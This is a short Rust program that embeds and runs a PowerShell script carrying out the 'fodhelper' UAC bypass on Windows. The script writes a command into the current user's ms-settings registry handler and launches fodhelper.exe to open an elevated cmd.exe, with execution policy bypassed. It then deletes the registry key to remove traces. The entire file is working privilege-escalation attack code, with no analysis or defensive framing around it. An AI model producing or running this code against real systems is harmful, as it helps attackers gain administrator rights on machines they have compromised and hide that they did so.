use std::process::Command;

fn main() {
    execute_fodhelper_bypass();
}

/// Executes a UAC bypass using the fodhelper technique via previous PowerShell script.
fn execute_fodhelper_bypass() {
    // Define the PowerShell script to modify registry and execute cmd.exe with elevated privileges
    let ps_script = r#"
        $registryPath = 'HKCU:\Software\Classes\ms-settings\Shell\Open\command';
        $command = 'cmd /c start cmd.exe';
        $delegateExecute = '';

        if (-not (Test-Path $registryPath)) {
            New-Item -Path $registryPath -Force | Out-Null;
        }

        Set-ItemProperty -Path $registryPath -Name '(Default)' -Value $command;
        Set-ItemProperty -Path $registryPath -Name 'DelegateExecute' -Value $delegateExecute;

        Start-Process 'C:\Windows\System32\fodhelper.exe' -Verb RunAs;
    "#;

    // Execute the PowerShell script to apply the UAC bypass
    let _ = Command::new("powershell")
        .arg("-NoProfile")
        .arg("-ExecutionPolicy")
        .arg("Bypass")
        .arg("-Command")
        .arg(&ps_script)
        .output();

    // Clean up by removing the registry keys used for the bypass
    let _ = Command::new("powershell")
        .arg("-NoProfile")
        .arg("-ExecutionPolicy")
        .arg("Bypass")
        .arg("-Command")
        .arg("Remove-Item -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Recurse")
        .output();
}